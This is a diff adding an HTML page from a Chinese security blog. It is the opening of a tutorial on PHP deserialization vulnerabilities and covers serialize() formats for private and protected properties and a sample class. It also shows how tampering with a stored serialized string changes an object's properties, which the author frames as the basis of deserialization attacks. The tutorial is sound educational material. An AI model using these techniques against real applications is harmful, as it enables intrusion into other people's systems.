@@ -1,0 +1,1273 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0X00 前言自从 Orange 在 2017年的 hitcon 出了一个 0day 的 php phar:// 反序列化给整个安全界开启了新世界的大门以后，php 反序列化这个漏洞就逐渐升温，没想到后来 2018 年 blackhat 的议题上这个问题再次被提及，利用的还是 Orange 的思路(我只能 orz),到现在 phar:// 反序列化已经成为了各大 CTF 炙手可热的思路，就仿佛 2">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一篇文章带你深入理解漏洞之 PHP 反序列化漏洞">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 反序列化漏洞/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0X00 前言自从 Orange 在 2017年的 hitcon 出了一个 0day 的 php phar:// 反序列化给整个安全界开启了新世界的大门以后，php 反序列化这个漏洞就逐渐升温，没想到后来 2018 年 blackhat 的议题上这个问题再次被提及，利用的还是 Orange 的思路(我只能 orz),到现在 phar:// 反序列化已经成为了各大 CTF 炙手可热的思路，就仿佛 2">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E6%98%BE%E7%A4%BA.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E7%94%9F%E6%88%90.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20serialize0.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/private%20%E5%BA%8F%E5%88%97%E5%8C%96.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/protected%20%E5%BA%8F%E5%88%97%E5%8C%96.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%201.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96__%E7%BB%93%E6%9E%9C1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%B1%9E%E6%80%A71.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvps0cgkkj211h0ex40y.jpg">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%981.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%982.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%983.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%984.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%20%E5%AE%9E%E6%88%985.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/POP%E9%93%BE%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%E6%A0%BC%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%9A%84.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/stub.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20manifest.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E5%8A%9F.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvr45w4llj21fi0hxwgc.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvr6aa2zjj20na0k2abm.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvr6h135rj21d70alwft.jpg">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89%E5%93%AA%E4%BA%9B%20wrappers.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%20%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/file_get_contents.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/open_wrapper.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fopen%20%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20%E6%BA%90%E7%A0%81%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysqlnd.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/libxml.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/fileinfo.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%811.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/zlib%20%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar_another2.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.434Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一篇文章带你深入理解漏洞之 PHP 反序列化漏洞">
+<meta name="twitter:description" content="0X00 前言自从 Orange 在 2017年的 hitcon 出了一个 0day 的 php phar:// 反序列化给整个安全界开启了新世界的大门以后，php 反序列化这个漏洞就逐渐升温，没想到后来 2018 年 blackhat 的议题上这个问题再次被提及，利用的还是 Orange 的思路(我只能 orz),到现在 phar:// 反序列化已经成为了各大 CTF 炙手可热的思路，就仿佛 2">
+<meta name="twitter:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E6%98%BE%E7%A4%BA.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 反序列化漏洞/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>一篇文章带你深入理解漏洞之 PHP 反序列化漏洞 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">一篇文章带你深入理解漏洞之 PHP 反序列化漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-05 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-05T00:00:00+08:00">2019-01-05</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">23k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">21 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>自从 Orange 在 2017年的 hitcon 出了一个 0day 的 php phar:// 反序列化给整个安全界开启了新世界的大门以后，php 反序列化这个漏洞就逐渐升温，没想到后来 2018 年 blackhat 的议题上这个问题再次被提及，利用的还是 Orange 的思路(我只能 orz),到现在 phar:// 反序列化已经成为了各大 CTF 炙手可热的思路，就仿佛 2016 年的 CVE-2016-7124 绕过 __weakup 一样，于是我也把这篇文章提上日程，希望能在对整个 PHP 反序列化漏洞的剖析过程中对其有更深入的理解，也希望读者在读我的文章中能有不一样的体验和收获(如果真的是这样，这将是我莫大的荣幸)</p>
+<h2 id="0X01-什么是序列化和反序列化"><a href="#0X01-什么是序列化和反序列化" class="headerlink" title="0X01 什么是序列化和反序列化"></a><strong>0X01 什么是序列化和反序列化</strong></h2><h3 id="1-从-json-开始类比"><a href="#1-从-json-开始类比" class="headerlink" title="1.从 json 开始类比"></a><strong>1.从 json 开始类比</strong></h3><p>我先不说序列化，大家都看到过 json 数据吧，<strong>json 什么样子的</strong>？</p>
+<p><strong>如图所示:</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E6%98%BE%E7%A4%BA.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E6%98%BE%E7%A4%BA.png" alt="此处输入图片的描述"></a></p>
+<p>我们看到不同组数据之间都是使用逗号分隔，每组数据内部使用冒号分隔键和值，整体看上去是一个字符串的样子，那么他原来的面目是什么呢？</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E7%94%9F%E6%88%90.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/json%20%E7%94%9F%E6%88%90.png" alt="此处输入图片的描述"></a></p>
+<p>我们看到，这个 json 字符串的真面目是一个数组，但是通常情况下为了前后端之间的传输方便我们将其 json_encode 了，然后我们后端如果接受到这个 json 数据，还能在 json_decode 回来，再通俗一点就是tx 目前不支持直接传输文件夹，我们必须要压缩一下然后传输，对方接收到需要解压才能看到你的数据，那么这种将原本的数据通过某种手段进行“压缩”，并且按照一定的格式存储的过程就可以称之为序列化</p>
+<h3 id="2-PHP-的序列化"><a href="#2-PHP-的序列化" class="headerlink" title="2.PHP 的序列化"></a><strong>2.PHP 的序列化</strong></h3><p>PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，他所使用的函数是serialize() ,我们来看下面的实例</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20serialize0.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20serialize0.png" alt="此处输入图片的描述"></a></p>
+<p>这是一个简单的 php 类，然后我们实例化以后对其属性进行了赋值，然后调用了 serialize() 并且输出，我们看一下输出的结果</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></a></p>
+<p>我们看到这个和刚刚的 json 长得有些不一样了，具体的含义我已经在途中有所标注（其中属性名和属性值的格式与前面对象名的格式类似我就没有重复说明）</p>
+<blockquote>
+<p><strong>注意：这里是第一个非常重要的点</strong></p>
+<p>如果你是细心的同学，你可能会注意到一个小问题，按照我前面对象名的格式算的话你可能会发现后面的属性名有些另类，你看啊,我代码里面明明写的是<br>flag 属性，序列化以后却变成了 testflag ，而且前面说好的长度也不一样了，testflag<br>明明是8个字符，到你这里却成了10个，除此之外后面的 test 属性也“变异了”，前面多了个（*）并且长度也不对，这到底是咋了？</p>
+</blockquote>
+<p>嗯，如果你发现这个问题，那么说明你认真地思考了，这其实涉及到了 PHP 的属性的访问权限问题，序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，必然也会将属性的权限序列化进去，我们发现我定义的类的属性有三种 private protected 和 默认的 public(写不写都一样)，其中</p>
+<p><strong>(1)Puiblic 权限：</strong></p>
+<p>他的序列化规规矩矩，按照我们常规的思路，该是几个字符就是几个字符，你看那个 test1 属性，是不是这样？</p>
+<p><strong>(2)Private 权限：</strong></p>
+<p>该权限是私有权限，也就是说只能 test类使用，于是乎 test 有着强烈的占有欲，于是在序列化的时候一定要在 private 属性前面加上自己的名字，向世界表明这个属性是我独自占有的，但是好像长度还是不对，还少了两个，怎么回事？</p>
+<p>这样，我们将其序列化的结果存入一个文件中，我们使用 Hexdump 看一下内部的结构，为了去除浏览器对整个过程的影响我修改一下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'Inactive'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test = <span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test1 = <span class="string">"test1"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">$object-&gt;set_flag(<span class="string">'Active'</span>);</span><br><span class="line">$data = serialize($object);</span><br><span class="line">file_put_contents(<span class="string">"serialize.txt"</span>, $data);</span><br></pre></td></tr></table></figure>
+
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/private%20%E5%BA%8F%E5%88%97%E5%8C%96.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/private%20%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="此处输入图片的描述"></a></p>
+<p>我们看到 test 的前后出现了两个 %00 ，也就是空白符，现在是不是字符数也凑够了？那么现在请你记住这个规定，在私有属性序列化的时候格式是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00类名%00属性名</span><br></pre></td></tr></table></figure>
+
+<p><strong>(2)Protected 权限：</strong></p>
+<p>这个也很奇怪，但是没关系我们看 hexdump 的结果</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/protected%20%E5%BA%8F%E5%88%97%E5%8C%96.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/protected%20%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="此处输入图片的描述"></a></p>
+<p>这里我就不详细说了，反正格式就是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00*%00属性名</span><br></pre></td></tr></table></figure>
+
+<p>这个特性一定要非常的清楚，如果很模糊的话，在我们后期构造或者修改我们的攻击向量的时候很容易出现错误</p>
+<blockquote>
+<p><strong>注意：这里是第二个非常重要的点</strong></p>
+<p>如果你再细致一点，你可能会发现这样一个问题，你这个类定义了那么多方法，怎么把对象序列化了以后全都丢了？你看你整个序列化的字符串里面全是属性，就没有一个方法，这是为啥？</p>
+</blockquote>
+<p>请记住，序列化他只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：</p>
+<p><strong>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</strong></p>
+<p>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p>
+<p><strong>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</strong></p>
+<p>因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）</p>
+<h3 id="3-PHP-的反序列化"><a href="#3-PHP-的反序列化" class="headerlink" title="3.PHP 的反序列化"></a><strong>3.PHP 的反序列化</strong></h3><p>有序列化 化对象为压缩格式化的字符串，就有反序列化，将压缩格式化的字符串还原</p>
+<p>我们还是沿用上面的代码，我现在将 serialize.txt 里面的内容进行反序列化，并输出属性值 test1 和 flag 的值</p>
+<p><strong>如图所示:</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%201.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%201.png" alt="此处输入图片的描述"></a></p>
+<p><strong>结果如下：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96__%E7%BB%93%E6%9E%9C1.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96__%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></a></p>
+<p>我们看到本来存储在文件中的一串字符，在 uiseralize() 的作用下还原成了对象，并且实现了 属性和方法的调用</p>
+<p>那我拓展一下，比如说我是一个黑客，我想使坏，我在电脑主人不知道的情况下悄悄改了这个 serialize.txt 的内容，改成了下面这样<strong>（注意红色方框的部分）</strong></p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%B1%9E%E6%80%A71.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%B1%9E%E6%80%A71.png" alt="此处输入图片的描述"></a></p>
+<p>那么当电脑主人运行这段代码的时候看到的会是什么呢？</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C1.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AF%A1%E6%94%B9%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></a></p>
+<p>哇咔咔， K0rz3n Hack 成功，想必电脑主人会吓一跳，会不会赶紧打开杀毒软件进行全盘的扫描呢？hhh，当然这就不是我要考虑的问题了，<strong>这个小例子其实就是我们反序列化攻击的原理的核心内容</strong>，这里算是抛砖引玉吧</p>
+<h2 id="0X02-为什么要-PHP-的序列化和反序列化"><a href="#0X02-为什么要-PHP-的序列化和反序列化" class="headerlink" title="0X02 为什么要 PHP 的序列化和反序列化"></a><strong>0X02 为什么要 PHP 的序列化和反序列化</strong></h2><p>看到这里，肯定会有人问这个问题，如果说 json 是为了传递数据的方便性，那么 PHP 的序列化又是为了什么呢？</p>
+<p>当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦，是不是很方便？</p>
